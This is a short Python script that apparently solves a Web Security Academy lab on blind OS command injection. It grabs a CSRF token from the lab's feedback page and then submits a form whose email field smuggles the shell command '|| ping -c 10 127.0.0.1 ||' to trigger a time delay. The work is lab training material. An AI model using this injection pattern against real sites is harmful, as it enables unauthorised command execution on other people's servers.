import requests
from bs4 import BeautifulSoup

s = requests.Session()
feedback_url = 'https://ace71f341e9fa05f80ce340c00950091.web-security-academy.net/feedback'
resp = s.get(feedback_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

fedback_submit_url = 'https://ace71f341e9fa05f80ce340c00950091.web-security-academy.net/feedback/submit'
post_data = {
    'csrf' : csrf,
    'name' : 'bepis',
    'email' : 'beepis@sleepis.net || ping -c 10 127.0.0.1 ||',
    'subject' : 'restis',
    'message' : 'wakeis'
}
resp = s.post(fedback_submit_url, data=post_data)
print(resp.text)